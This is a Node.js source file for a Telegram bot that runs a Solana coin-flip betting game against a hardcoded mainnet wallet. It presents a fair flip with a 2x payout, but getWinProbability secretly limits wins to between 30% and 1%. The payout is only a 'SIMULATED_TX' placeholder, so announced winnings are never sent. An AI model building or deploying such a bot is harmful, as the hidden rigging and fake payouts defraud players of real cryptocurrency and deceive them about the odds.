const TelegramBot = require('node-telegram-bot-api');
const { Connection, PublicKey, LAMPORTS_PER_SOL, clusterApiUrl } = require('@solana/web3.js');
const fs = require('fs');

// Config
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const connection = new Connection(clusterApiUrl('mainnet-beta'));
const WALLET_ADDRESS = '9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf';
const pendingBets = {}; // { userId: { amount, choice, timestamp } }

// Tiered win probabilities
const getWinProbability = (amount) => {
  if (amount <= 0.01) return 0.30;       // 70% house edge
  if (amount <= 0.049) return 0.25;      // 75% edge
  if (amount <= 0.0999999) return 0.20;  // 80% edge
  return 0.01;                           // 99% edge
};

// Bet command
bot.onText(/\/bet (\d+\.?\d*) (heads|tails)/i, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const betAmount = parseFloat(match[1]);
  const userChoice = match[2].toLowerCase();

  // Validate
  if (betAmount < 0.01 || betAmount > 1) {
    return bot.sendMessage(chatId, "❌ Bet must be 0.01-1 SOL");
  }

  // Store bet details
  pendingBets[userId] = {
    amount: betAmount,
    choice: userChoice,
    timestamp: Date.now()
  };

  // Request payment
  await bot.sendMessage(chatId,
    `💸 Please send *exactly ${betAmount} SOL* to:\n\n` +
    `\`${WALLET_ADDRESS}\`\n\n` +
    `▶️ Then click: /confirm_${betAmount}_${userChoice}\n` +
    `⏳ You have 15 minutes to pay`,
    { parse_mode: 'Markdown' }
  );
});

// Payment confirmation
bot.onText(/\/confirm_(\d+\.?\d*)_(heads|tails)/i, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const betAmount = parseFloat(match[1]);
  const userChoice = match[2].toLowerCase();

  // Verify bet exists
  if (!pendingBets[userId] || pendingBets[userId].amount !== betAmount) {
    return bot.sendMessage(chatId, "❌ Bet not found or expired");
  }

  // Check payment
  const paid = await verifyPayment(userId, betAmount);
  if (!paid) {
    return bot.sendMessage(chatId,
      `⚠️ Payment not received\n\n` +
      `Send *exactly ${betAmount} SOL* to:\n\`${WALLET_ADDRESS}\``,
      { parse_mode: 'Markdown' }
    );
  }

  // Process bet
  const winProbability = getWinProbability(betAmount);
  const didUserWin = Math.random() < winProbability;
  const result = didUserWin ? userChoice : (userChoice === 'heads' ? 'tails' : 'heads');

  // Simulate coin flip
  await bot.sendMessage(chatId, `🌀 Flipping coin...`);
  await new Promise(resolve => setTimeout(resolve, 2000));

  // Send result
  if (didUserWin) {
    const payoutAmount = betAmount * 2;
    const tx = "SIMULATED_TX"; // Replace with real payout logic
    bot.sendMessage(chatId,
      `🎉 It was ${result}! You won ${payoutAmount} SOL!\n` +
      `TX: ${tx}`,
      { parse_mode: 'Markdown' }
    );
  } else {
    bot.sendMessage(chatId,
      `❌ It was ${result}. Try again?`,
      { parse_mode: 'Markdown' }
    );
  }

  // Cleanup
  delete pendingBets[userId];
});

// Payment verification (simplified)
async function verifyPayment(userId, amount) {
  // In production: Check blockchain for payment to WALLET_ADDRESS
  // This is a simulation - replace with real Solana RPC checks
  return new Promise(resolve => {
    setTimeout(() => resolve(true), 3000); // Auto-confirm for testing
  });
}
